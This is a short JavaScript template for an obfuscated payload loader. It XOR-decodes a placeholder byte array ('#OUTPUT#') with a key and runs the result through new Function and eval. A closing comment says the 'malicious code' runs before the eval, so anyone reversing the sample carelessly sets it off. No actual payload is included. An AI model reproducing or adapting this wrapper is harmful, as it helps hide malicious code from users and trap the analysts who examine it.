// don't forget to set the "key" and OUTPUT
function a(x){for(var T='',i=0;i<x.length;i++)T+=String.fromCharCode(x[i]^key.charCodeAt(Math.floor(i%key.length)));return new Function(T)();}
let y=a([#OUTPUT#]);
eval(y)

//the malicious code should execute BEFORE the eval, therefore a reversing of this would execute the code if done lazily
